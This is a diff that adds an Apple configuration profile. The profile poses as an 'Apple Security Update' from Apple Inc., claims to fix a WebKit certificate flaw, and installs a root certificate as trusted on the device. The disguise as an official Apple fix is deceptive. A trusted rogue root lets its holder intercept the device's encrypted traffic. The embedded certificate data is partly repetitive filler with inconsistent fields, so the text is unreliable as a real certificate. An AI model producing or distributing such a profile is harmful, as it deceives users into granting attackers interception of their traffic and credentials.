@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Installs updated security certificate to fix WebKit validation</string>
+            <key>PayloadDisplayName</key>
+            <string>Apple Security Update</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.security.cert.fix</string>
+            <key>PayloadType</key>
+            <string>com.apple.security.root</string>
+            <key>PayloadUUID</key>
+            <string>B8F2A9E1-4C7D-4F8A-9B3C-2E5F6A8D9C1B</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadCertificateFileName</key>
+            <string>SecurityCert</string>
+            <key>PayloadContent</key>
+            <data>
+            MIIDXTCCAkWgAwIBAgIJAKL5xYq7Z8yDMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
+            BAYTAlVTMQswCQYDVQQIDAJUWDEPMA0GA1UEBwwGQXVzdGluMQwwCgYDVQQKDANE
+            T0IxFDASBgNVBAMMC2RvYi50ZXhhcy5nb3IwHhcNMjUwMTAxMDAwMDAwWhcNMzAw
+            MTAxMDAwMDAwWjBFMQswCQYDVQQGEwJVUzELMAkGA1UECAwCVFgxDzANBgNVBAcM
+            BkF1c3RpbjEMMAoGA1UECgwDRE9CMRQwEgYDVQQDDAtkb2IudGV4YXMuZ292MIIB
+            IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxU5t3L5qX5JpYl5G5pZ5J5l5
+            L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ
+            5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l
+            5QIDAQABo4GXMIGUMB0GA1UdDgQWBBQxU5t3L5qX5JpYl5G5pZ5J5l5L5p5J5l5G
+            MAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgLkMB0GA1UdJQQWMBQGCCsGAQUFBwMB
+            BggrBgEFBQcDAjAhBgNVHREEGjAYggt3d3cuZG9iLnRleGFzhwR/AAABMA0GCSqG
+            SIb3DQEBCwUAA4IBAQAt5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G
+            5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J
+            5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L
+            5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5J5l5L5p5J5l5G5pZ5
+            </data>
+        </dict>
+    </array>
+    <key>PayloadDescription</key>
+    <string>Security update for WebKit certificate validation (CVE-2024-27824)</string>
+    <key>PayloadDisplayName</key>
+    <string>Apple Security Update</string>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.security.update</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Inc.</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>3F8A2B9E-4C7D-4F8A-9B3C-2E5F6A8D9C1B</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+</dict>
+</plist>
